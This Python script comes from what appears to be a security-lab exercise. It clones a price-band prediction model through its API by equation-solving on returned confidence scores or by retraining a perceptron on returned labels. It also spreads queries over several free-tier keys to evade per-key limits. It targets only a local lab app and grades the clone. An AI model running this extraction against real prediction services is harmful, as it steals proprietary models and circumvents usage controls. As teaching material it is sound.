#!/usr/bin/env python3
"""Attack skill — extract Big Field Jumper Co.'s price-band model through Lamb's prediction API.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Runs the plans in ``assets/extraction_plan.json``. Each plan really queries
the API (``POST /v1/predict``, batches of up to 100 listings) with its own
free-tier key(s) and builds a clone from the answers:

* ``equation_solving`` — when the answers carry confidences, log(p_k / p_ref)
  is linear in the listing for a logistic model, so 8 queries give 8
  equations per class and Gaussian elimination gives the exact weights
  (Tramèr et al., 2016). Without confidences it falls back to retraining on
  the bands it got.
* ``retrain`` — trains a linear clone (an averaged multiclass perceptron, pure
  Python) on the (listing, band) pairs.

Samplers: ``uniform`` draws across the API's documented ranges;
``listing_like`` varies listings from the public catalog, so its queries look
like real stock. The only effect is a clone in the attacker's memory, which
the lab's owner grades (``POST /lab/grade``).

``--plan ID`` runs one plan, including the limit ``distributed-keys``; the
default runs the three attack plans.

Exit code: 0 when the plans ran, 1 when the target is unreachable or the plan
id is unknown.

Examples:
    python scripts/run_extraction.py
    python scripts/run_extraction.py --plan equation-solving
    python scripts/run_extraction.py --plan distributed-keys
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import urllib.error
import urllib.request
from typing import Any, Callable, Dict, List, Optional

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("HX10_TARGET", "http://127.0.0.1:5510")
sys.path.insert(0, SKILL_DIR)

from vulnerable_app import (  # noqa: E402
    API_RANGES, CLASSES, FEATURES, MAX_BATCH, REFERENCE, LinearModel, as_listing, as_vector,
    load_plan, plan_by_id,
)

QueryFn = Callable[[str, List[Dict[str, Any]]], List[Dict[str, Any]]]
ATTACK_SEED = 31337
ENVELOPE_GUESS = {"weight_kg": (0.2, 25.0), "shelf_life_months": (0, 36), "demand_index": (0.05, 0.95),
                  "rating": (2.5, 5.0)}   # what the attacker reads off the public catalog


# --------------------------------------------------------------------------- #
# Samplers
# --------------------------------------------------------------------------- #
def uniform_listing(rng: random.Random) -> List[float]:
    lo = {f: API_RANGES[f][0] for f in FEATURES}
    hi = {f: API_RANGES[f][1] for f in FEATURES}
    return [round(rng.uniform(lo["weight_kg"], hi["weight_kg"]), 1), rng.randint(0, 60), rng.randint(0, 1),
            rng.randint(0, 1), rng.randint(1, 3), round(rng.random(), 2), round(rng.uniform(1.0, 5.0), 1)]


def listing_like(rng: random.Random, catalog: List[Dict[str, Any]]) -> List[float]:
    """A variation of a real public listing, kept inside the range the catalog shows."""
    b = as_vector(rng.choice(catalog))
    clip = lambda f, v: min(ENVELOPE_GUESS[f][1], max(ENVELOPE_GUESS[f][0], v))  # noqa: E731
    return [round(clip("weight_kg", b[0] * rng.uniform(0.7, 1.4)), 1),
            int(clip("shelf_life_months", b[1] + rng.randint(-4, 4))),
            b[2] if rng.random() > 0.3 else 1 - b[2], b[3] if rng.random() > 0.3 else 1 - b[3],
            b[4] if rng.random() > 0.3 else rng.randint(1, 3),
            round(clip("demand_index", b[5] + rng.uniform(-0.15, 0.15)), 2),
            round(clip("rating", b[6] + rng.uniform(-0.4, 0.4)), 1)]


def plan_queries(entry: Dict[str, Any], catalog: List[Dict[str, Any]]) -> Dict[str, List[List[float]]]:
    """The query stream of each key in a plan (deterministic for a plan id)."""
    rng = random.Random(f"{ATTACK_SEED}:{entry['id']}")
    keys = entry.get("keys") or [entry["key"]]
    per_key = entry.get("queries_per_key") or entry["queries"]
    draw = (lambda: uniform_listing(rng)) if entry["sampler"] == "uniform" else (lambda: listing_like(rng, catalog))
    return {key: [draw() for _ in range(per_key)] for key in keys}


# --------------------------------------------------------------------------- #
# Clone builders
# --------------------------------------------------------------------------- #
def solve(A: List[List[float]], y: List[float]) -> Optional[List[float]]:
    """Gaussian elimination with partial pivoting; None when the system is singular."""
    n = len(A)
    M = [list(row) + [v] for row, v in zip(A, y)]
    for c in range(n):
        p = max(range(c, n), key=lambda r: abs(M[r][c]))
        if abs(M[p][c]) < 1e-12:
            return None
        M[c], M[p] = M[p], M[c]
        for r in range(n):
            if r != c:
                f = M[r][c] / M[c][c]
                M[r] = [a - f * b for a, b in zip(M[r], M[c])]
    return [M[i][n] / M[i][i] for i in range(n)]


def equation_solve(X: List[List[float]], confidences: List[Dict[str, float]]) -> Optional[LinearModel]:
    """Exact weights from d+1 confidence vectors: log(p_k / p_ref) = w_k . x + b_k."""
    import math
    if len(X) < len(FEATURES) + 1:
        return None
    A = [list(x) + [1.0] for x in X[:len(FEATURES) + 1]]
    rows: List[List[float]] = []
    bias: List[float] = []
    for k, name in enumerate(CLASSES):
        if k == REFERENCE:
            rows.append([0.0] * len(FEATURES))
            bias.append(0.0)
            continue
        try:
            y = [math.log(c[name] / c[CLASSES[REFERENCE]]) for c in confidences[:len(A)]]
        except (ValueError, ZeroDivisionError):
            return None
        theta = solve(A, y)
        if theta is None:
            return None
        rows.append(theta[:-1])
        bias.append(theta[-1])
    return LinearModel(rows, bias)


def train_perceptron(X: List[List[float]], y: List[int], epochs: int = 30, seed: int = 7) -> LinearModel:
    """Averaged multiclass perceptron on the attacker's own standardized sample; folded back to raw units."""
    import math
    if not X:
        return LinearModel([[0.0] * len(FEATURES) for _ in CLASSES], [0.0, 1.0, 0.0])
    d, n = len(X[0]), len(X)
    mu = [sum(r[j] for r in X) / n for j in range(d)]
    sd = [max(1e-9, math.sqrt(sum((r[j] - mu[j]) ** 2 for r in X) / n)) for j in range(d)]
    Z = [[(r[j] - mu[j]) / sd[j] for j in range(d)] + [1.0] for r in X]
    W = [[0.0] * (d + 1) for _ in CLASSES]
    A = [[0.0] * (d + 1) for _ in CLASSES]
    c = 1
    order = list(range(n))
    rng = random.Random(seed)
    for _ in range(epochs):
        rng.shuffle(order)
        for i in order:
            z, t = Z[i], y[i]
            scores = [sum(w * v for w, v in zip(W[k], z)) for k in range(len(CLASSES))]
            p = max(range(len(CLASSES)), key=lambda k: scores[k])
            if p != t:
                for j in range(d + 1):
                    W[t][j] += z[j]
                    W[p][j] -= z[j]
                    A[t][j] += c * z[j]
                    A[p][j] -= c * z[j]
            c += 1
    Wf = [[W[k][j] - A[k][j] / c for j in range(d + 1)] for k in range(len(CLASSES))]
    raw_w = [[Wf[k][j] / sd[j] for j in range(d)] for k in range(len(CLASSES))]
    raw_b = [Wf[k][d] - sum(Wf[k][j] * mu[j] / sd[j] for j in range(d)) for k in range(len(CLASSES))]
    return LinearModel(raw_w, raw_b)


def campaign(query: QueryFn, entry: Dict[str, Any], catalog: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Send a plan's queries through ``query`` (in-process or HTTP) and build the clone."""
    X: List[List[float]] = []
    labels: List[int] = []
    confidences: List[Dict[str, float]] = []
    sent = refused = 0
    reasons: List[str] = []
    for key, stream in plan_queries(entry, catalog).items():
        for start in range(0, len(stream), MAX_BATCH):
            batch = stream[start:start + MAX_BATCH]
            answers = query(key, [as_listing(x) for x in batch])
            sent += len(batch)
            for x, ans in zip(batch, answers):
                if "band" not in ans:
                    refused += 1
                    if ans.get("refused") and ans["refused"] not in reasons:
                        reasons.append(ans["refused"])
                    continue
                X.append(x)
                labels.append(CLASSES.index(ans["band"]))
                if "confidence" in ans:
                    confidences.append(ans["confidence"])
            if answers and all("band" not in a for a in answers):
                break                      # this key is shut; move to the next
    method = "retrain"
    clone = None
    if entry["strategy"] == "equation_solving" and len(confidences) == len(X):
        clone = equation_solve(X, confidences)
        method = "equation_solving" if clone is not None else "retrain"
    if clone is None:
        clone = train_perceptron(X, labels)
    return {"plan": entry["id"], "clone": clone, "method": method, "sent": sent, "answered": len(X),
            "refused": refused, "refusals": reasons, "used_confidences": method == "equation_solving"}


# --------------------------------------------------------------------------- #
# HTTP
# --------------------------------------------------------------------------- #
def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"),
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=120) as resp:
        return json.loads(resp.read())


def _get(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=10) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        ok = _get(f"{base}/health").get("demo") == "hx10"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the HX10 target. Start it: python vulnerable_app.py")
    return ok


def http_query(base: str) -> QueryFn:
    def query(key: str, listings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        return _post(f"{base}/v1/predict", {"key": key, "listings": listings})["answers"]
    return query


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--plan", help="run this plan id only (see assets/extraction_plan.json)")
    args = parser.parse_args(argv)
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if not check_target(args.target):
        return 1
    try:
        entries = [plan_by_id(args.plan)] if args.plan else load_plan()["attacks"]
    except KeyError as exc:
        print(f"[-] {exc}")
        return 1
    if not args.plan:
        _post(f"{args.target}/api/attack", {})
    catalog = _get(f"{args.target}/catalog")["listings"]
    for entry in entries:
        print(f"[*] Plan '{entry['id']}': {entry['route']}")
        run = campaign(http_query(args.target), entry, catalog)
        grade = _post(f"{args.target}/lab/grade", {"clone": run["clone"].to_dict()})
        print(f"[+] {run['answered']} of {run['sent']} queries answered ({run['method']}); clone agreement "
              f"{grade['agreement']:.1%} on held-out listings; fingerprint canary "
              f"{'RECOVERED' if grade['canary_recovered'] else 'not recovered'}"
              + (f"; refused: {', '.join(run['refusals'])}" if run["refusals"] else ""))
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
